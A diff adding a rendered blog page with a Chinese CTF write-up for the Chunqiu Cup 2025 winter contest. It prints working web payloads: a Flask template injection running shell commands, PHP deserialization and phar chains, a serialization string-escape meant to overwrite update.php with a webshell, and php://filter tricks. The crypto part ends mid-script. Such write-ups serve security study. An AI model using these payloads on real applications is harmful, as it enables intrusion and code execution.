@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>春秋杯冬季赛2025 | 0raN9e&#39;s Blog</title>
+<meta name="keywords" content="ctf">
+<meta name="description" content="Web
+easy_flask
+模板注入无waf
+{{x.__class__.__base__.__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()}}
+或者fenjing也可以
+
+file_copy
+yakit抓包尝试报错看到用的是copy函数，filter的漏洞利用
+
+gotar
+分析一下源码，想到了软链接，通过指向得到flag
+tar软链接读取
+ln -s /flag flag
+tar cf 1.tar ../../flag
+访问
+/assets/extracted/flag
+easy_ser
+&lt;?php
+class STU{
+    public $stu;
+}
+class SDU{
+    public $Dazhuan;
+}
+class CTF{
+    public $hackman;
+    public $filename=&#39;orange.php&#39;;
+}
+$exp=new SDU();
+$exp-&gt;Dazhuan=new STU;
+$exp-&gt;Dazhuan-&gt;stu=new CTF;
+$exp-&gt;Dazhuan-&gt;stu-&gt;hackman=&#39;PD89YGNhdCAvZmxhZ2A7&#39;;
+echo urlencode(serialize($exp));
+b0okshelf(浮现)
+首先dirsearch扫一下，有backup.zip，代码主要看update.php和data.php
+#update.php
+    file_put_contents(&#39;books/&#39; . $book-&gt;id . &#39;.info&#39;, waf(serialize($book)));
+    $book-&gt;reader-&gt;setContent($_POST[&#39;content&#39;]);
+}
+
+function waf($data)
+{
+    return str_replace(&#34;&#39;&#34;, &#34;\\&#39;&#34;, $data);
+}
+可以写入内容，有字符串逃逸，看一下给的info内容
+O:4:&#34;Book&#34;:5:{s:2:&#34;id&#34;;s:13:&#34;67710e145d826&#34;;s:5:&#34;title&#34;;s:24:&#34;SQL注入攻击与防御&#34;;s:6:&#34;author&#34;;s:44:&#34;Justin，Clarke 著，施宏斌，叶愫 译&#34;;s:7:&#34;summary&#34;;s:147:&#34;理解、发现、利用和防御日益增长的SQL注入攻击的有力武器，适用于SQLServer、Oracle、MySQL、PostgreSQL等主流数据库&#34;;s:6:&#34;reader&#34;;O:6:&#34;Reader&#34;:1:{s:16:&#34; Reader location&#34;;s:23:&#34;books/67710e145d826.txt&#34;;}}
+&lt;?php
+
+class Book {
+    public $id;
+    public $title;
+    public $author;
+    public $summary;
+    public $reader;
+}
+
+class Reader
+{
+    public function getLocation()
+    {
+        return $this-&gt;location;
+    }
+    public function __construct($location)
+    {
+        $this-&gt;location = $location;
+    }
+    private $location;
+    public function getContent()
+    {
+        return file_get_contents($this-&gt;location);
+    }
+    public function setContent($content)
+    {
+        file_put_contents($this-&gt;location, $content);
+    }
+
+
+}
+
+$exp=new Book();
+$exp-&gt;id=&#39;123&#39;;
+$exp-&gt;title=&#39;123&#39;;
+$exp-&gt;author=&#39;123&#39;;
+$parta=&#39;&#34;;s:6:&#34;reader&#34;;O:6:&#34;Reader&#34;:1:{s:16:&#34;&#39;;
+$partb=&#39;Reader&#39;;
+$partc=&#39;location&#34;;s:10:&#34;update.php&#34;;}};&#39;;
+$payload=$parta.&#34;\x00&#34;.$partb.&#34;\x00&#34;.$partc;
+#print($payload);
+$len=strlen($payload);
+print(&#34;[&#43;]length:&#34;.$len.&#34;\n&#34;);
+$exp-&gt;summary=str_repeat(&#39;\&#39;&#39;, $len) . $payload;//逃逸
+$exp-&gt;reader=new Reader(&#39;books/&#39; . &#39;qqq&#39;);
+function waf($data)
+{
+    return str_replace(&#34;&#39;&#34;, &#34;\\&#39;&#34;, $data);
+}
+echo &#34;[&#43;] Summary: &#34;;
+echo urlencode($exp-&gt;summary);
+$result=waf(serialize($exp));
+echo &#34;\n[&#43;] Serialized payload: &#34;;
+echo base64_encode($result);
+echo &#34;\n&#34;;
+$newBook = unserialize($result);
+echo &#34;[&#43;] Location: &#34;;
+echo $newBook-&gt;reader-&gt;getLocation();
+传入summary，然后给content写入🐎可以拿到shell，不会了，就到这吧。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="0raN9e&#39;s Blog (Alt + H)">0raN9e&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/links/" title="友链">
+                    <span>友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      春秋杯冬季赛2025
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="easy_flask">easy_flask<a hidden class="anchor" aria-hidden="true" href="#easy_flask">#</a></h2>
+<p>模板注入无waf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{{</span>x.__class__.__base__.__subclasses__<span style="color:#f92672">()[</span>133<span style="color:#f92672">]</span>.__init__.__globals__<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;popen&#39;</span><span style="color:#f92672">](</span><span style="color:#e6db74">&#39;cat flag&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()}}</span>
+</span></span></code></pre></div><p>或者fenjing也可以</p>
+<p><img alt="1" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/1.png"></p>
+<h2 id="file_copy">file_copy<a hidden class="anchor" aria-hidden="true" href="#file_copy">#</a></h2>
+<p>yakit抓包尝试报错看到用的是copy函数，filter的漏洞利用</p>
+<p><img alt="2" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/2.png"></p>
+<h2 id="gotar">gotar<a hidden class="anchor" aria-hidden="true" href="#gotar">#</a></h2>
+<p>分析一下源码，想到了软链接，通过指向得到flag</p>
+<p>tar软链接读取</p>
+<pre tabindex="0"><code>ln -s /flag flag
+tar cf 1.tar ../../flag
+</code></pre><p>访问</p>
+<p><code>/assets/extracted/flag</code></p>
+<h2 id="easy_ser">easy_ser<a hidden class="anchor" aria-hidden="true" href="#easy_ser">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">STU</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $stu;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SDU</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Dazhuan;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CTF</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hackman;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;orange.php&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SDU</span>();
+</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Dazhuan</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">STU</span>;
+</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Dazhuan</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stu</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">CTF</span>;
+</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Dazhuan</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stu</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hackman</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;PD89YGNhdCAvZmxhZ2A7&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($exp));
+</span></span></code></pre></div><h2 id="b0okshelf浮现">b0okshelf(浮现)<a hidden class="anchor" aria-hidden="true" href="#b0okshelf浮现">#</a></h2>
+<p>首先dirsearch扫一下，有backup.zip，代码主要看update.php和data.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">#update.php
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;books/&#39;</span> <span style="color:#f92672">.</span> $book<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">id</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.info&#39;</span>, <span style="color:#a6e22e">waf</span>(<span style="color:#a6e22e">serialize</span>($book)));
+</span></span><span style="display:flex;"><span>    $book<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">reader</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setContent</span>($_POST[<span style="color:#e6db74">&#39;content&#39;</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">waf</span>($data)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;&#34;</span>, $data);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以写入内容，有字符串逃逸，看一下给的info内容</p>
+<pre tabindex="0"><code class="language-info" data-lang="info">O:4:&#34;Book&#34;:5:{s:2:&#34;id&#34;;s:13:&#34;67710e145d826&#34;;s:5:&#34;title&#34;;s:24:&#34;SQL注入攻击与防御&#34;;s:6:&#34;author&#34;;s:44:&#34;Justin，Clarke 著，施宏斌，叶愫 译&#34;;s:7:&#34;summary&#34;;s:147:&#34;理解、发现、利用和防御日益增长的SQL注入攻击的有力武器，适用于SQLServer、Oracle、MySQL、PostgreSQL等主流数据库&#34;;s:6:&#34;reader&#34;;O:6:&#34;Reader&#34;:1:{s:16:&#34; Reader location&#34;;s:23:&#34;books/67710e145d826.txt&#34;;}}
+</code></pre><pre tabindex="0"><code>&lt;?php
+
+class Book {
+    public $id;
+    public $title;
+    public $author;
+    public $summary;
+    public $reader;
+}
+
+class Reader
+{
+    public function getLocation()
+    {
+        return $this-&gt;location;
+    }
+    public function __construct($location)
+    {
+        $this-&gt;location = $location;
+    }
+    private $location;
+    public function getContent()
+    {
+        return file_get_contents($this-&gt;location);
+    }
+    public function setContent($content)
+    {
+        file_put_contents($this-&gt;location, $content);
+    }
+
+
+}
+
+$exp=new Book();
+$exp-&gt;id=&#39;123&#39;;
+$exp-&gt;title=&#39;123&#39;;
+$exp-&gt;author=&#39;123&#39;;
+$parta=&#39;&#34;;s:6:&#34;reader&#34;;O:6:&#34;Reader&#34;:1:{s:16:&#34;&#39;;
+$partb=&#39;Reader&#39;;
+$partc=&#39;location&#34;;s:10:&#34;update.php&#34;;}};&#39;;
+$payload=$parta.&#34;\x00&#34;.$partb.&#34;\x00&#34;.$partc;
+#print($payload);
+$len=strlen($payload);
+print(&#34;[+]length:&#34;.$len.&#34;\n&#34;);
+$exp-&gt;summary=str_repeat(&#39;\&#39;&#39;, $len) . $payload;//逃逸
+$exp-&gt;reader=new Reader(&#39;books/&#39; . &#39;qqq&#39;);
+function waf($data)
+{
+    return str_replace(&#34;&#39;&#34;, &#34;\\&#39;&#34;, $data);
+}
+echo &#34;[+] Summary: &#34;;
+echo urlencode($exp-&gt;summary);
+$result=waf(serialize($exp));
+echo &#34;\n[+] Serialized payload: &#34;;
+echo base64_encode($result);
+echo &#34;\n&#34;;
+$newBook = unserialize($result);
+echo &#34;[+] Location: &#34;;
+echo $newBook-&gt;reader-&gt;getLocation();
+</code></pre><p>传入summary，然后给content写入🐎可以拿到shell，不会了，就到这吧。</p>
+<h2 id="easy_php">easy_php<a hidden class="anchor" aria-hidden="true" href="#easy_php">#</a></h2>
+<p>原题并且有非预期</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Chunqiu</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $params;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$Chunqiu <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Chunqiu</span>();
+</span></span><span style="display:flex;"><span>$show <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>();
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
+</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[<span style="color:#e6db74">&#39;source&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/flag&#34;</span>;
+</span></span><span style="display:flex;"><span>$Chunqiu<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> $show;
+</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#e6db74">&#39;str&#39;</span>] <span style="color:#f92672">=</span> $test;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;3xp.phar&#34;</span>); <span style="color:#75715e">//.phar文件
+</span></span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span>); <span style="color:#75715e">//固定的
+</span></span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($Chunqiu);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;exp.txt&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>); <span style="color:#75715e">//随便写点什么生成个签名，添加要压缩的文件
+</span></span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="easy_code">easy_code<a hidden class="anchor" aria-hidden="true" href="#easy_code">#</a></h2>
+<p>在gogogo.php里有内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?ctfer<span style="color:#f92672">=</span>%0a6.6699999999999999999999e2
+</span></span><span style="display:flex;"><span>&amp;file<span style="color:#f92672">=</span>php://filter/convert.iconv.utf-8.utf-16le/resource<span style="color:#f92672">=</span>read.php
+</span></span></code></pre></div><p>%0a绕过第二层，第三层用科学计数法，<code>cookie:pass=admin</code></p>
+<p>最后filter去往上找找相关的替换一下就行</p>
+<h1 id="crypto">crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h1>
+<h2 id="你是小哈斯">你是小哈斯?<a hidden class="anchor" aria-hidden="true" href="#你是小哈斯">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_hashes</span>(filename):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> [line<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip()]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_common_inputs</span>(hash_value):
+</span></span><span style="display:flex;"><span>    common_inputs <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">10</span>)) <span style="color:#f92672">+</span> list(<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> input_val <span style="color:#f92672">in</span> common_inputs:
+</span></span><span style="display:flex;"><span>        test_hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(str(input_val)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> test_hash <span style="color:#f92672">==</span> hash_value:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> str(input_val)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;题目内容.txt&#39;</span>
+</span></span><span style="display:flex;"><span>    hashes <span style="color:#f92672">=</span> read_hashes(filename)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line_num, hash_val <span style="color:#f92672">in</span> enumerate(hashes, <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;第</span><span style="color:#e6db74">{</span>line_num<span style="color:#e6db74">}</span><span style="color:#e6db74">行 哈希值: </span><span style="color:#e6db74">{</span>hash_val<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 尝试找到可能的原始输入</span>
+</span></span><span style="display:flex;"><span>        original <span style="color:#f92672">=</span> check_common_inputs(hash_val)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> original:
+</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">.</span>append(original)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;?&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">拼接后的结果:&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(result))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h2 id="通往哈希的旅程">通往哈希的旅程<a hidden class="anchor" aria-hidden="true" href="#通往哈希的旅程">#</a></h2>
+<p>hashcat爆破</p>
+<p><img alt="3" loading="lazy" src="../../images/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E5%86%AC2025/3.png"></p>
+<h2 id="funny_rsa">funny_rsa<a hidden class="anchor" aria-hidden="true" href="#funny_rsa">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>funny1 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374</span>
+</span></span><span style="display:flex;"><span>funny2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011</span>
+</span></span><span style="display:flex;"><span>funny3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024</span>
+</span></span><span style="display:flex;"><span>funny4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> (funny3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1025</span>) <span style="color:#f92672">//</span> funny2
